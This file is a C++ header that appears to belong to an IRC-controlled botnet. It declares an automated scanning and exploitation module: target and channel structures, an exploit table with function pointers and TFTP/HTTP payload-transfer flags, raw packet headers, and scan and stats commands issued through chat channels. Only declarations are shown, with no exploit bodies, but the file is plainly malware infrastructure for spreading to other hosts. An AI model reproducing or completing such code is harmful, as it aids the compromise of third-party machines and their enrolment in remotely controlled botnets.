

#include "defines.h"
#ifndef __ADSCANNER_H__
#define __ADSCANNER_H__
#include "rthread.h"
#include "../cstring.h"
#include "../commands.h"
#include "../message.h"
#include "../cthread.h"
#include "../sdthread.h"
char *GetIP(SOCKET sock);
DWORD WINAPI AdvPortScanner(LPVOID param);
DWORD WINAPI AdvScanner(LPVOID param);

typedef struct ADVSCAN {
	char ip[16];
	char chan[128];
	char msgchan[128];
	SOCKET sock;
	unsigned int port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	DWORD host;
	BOOL notice;
	BOOL silent;
	BOOL random;
	BOOL gotinfo;
	BOOL cgotinfo;

} ADVSCAN;

typedef struct ADVINFO {
	unsigned long ip;
	BOOL info;

} ADVINFO;

typedef struct EXINFO {
	SOCKET sock;
	char ip[16];
	char chan[128];
	char command[10];
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	BOOL option;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} EXINFO;
bool AddEx(EXINFO exinfo);
typedef BOOL (*efref)(EXINFO exinfo);

typedef struct EXPLOIT  {
	char command[10];
	char name[30];
	unsigned int port;
	efref exfunc;
	unsigned int stats;
	BOOL tftp;
	BOOL http;

} EXPLOIT;

typedef struct recvhdr  {
	struct _iphdr ip;
	struct tcphdr2 tcp;
	unsigned char junk_data[65535];

} RECVHEADER;


class CAdvScan : public CCommandHandler {
public:
	THREAD threads[MAXTHREADS]; 
	EXPLOIT *expl;
	void Init();
	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdCurIP,m_cmdAdvScan,m_cmdAdvScanStop,m_cmdAdvStats,m_cmdFTPStats;

};

#endif